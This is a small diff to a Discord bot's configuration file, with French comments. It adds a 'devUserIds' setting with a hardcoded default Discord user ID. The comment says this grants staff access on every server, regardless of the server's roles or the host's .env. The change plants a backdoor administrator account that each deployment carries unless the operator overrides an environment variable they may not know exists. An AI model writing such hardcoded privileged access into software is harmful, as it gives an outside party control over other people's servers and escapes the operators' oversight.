@@ -19,6 +19,9 @@ export const config = {
     // Acces aux commandes staff, en plus de la permission « Gerer le serveur ».
     adminRoleId: process.env.ADMIN_ROLE_ID ?? '',
     adminUserIds: (process.env.ADMIN_USER_IDS ?? '').split(',').map((s) => s.trim()).filter(Boolean),
+    // Developpeurs du bot : acces staff sur tout serveur, quels que soient
+    // les roles et le .env de la machine.
+    devUserIds: (process.env.DEV_USER_IDS ?? '1559619449324044299').split(',').map((s) => s.trim()).filter(Boolean),
     // Vide = avatar du bot. Ne jamais mettre une URL d attachement Discord
     // (parametres ex=/is=/hm=) : elle est signee et expire sous 24 h.
     logoUrl: process.env.LOGO_URL ?? '',
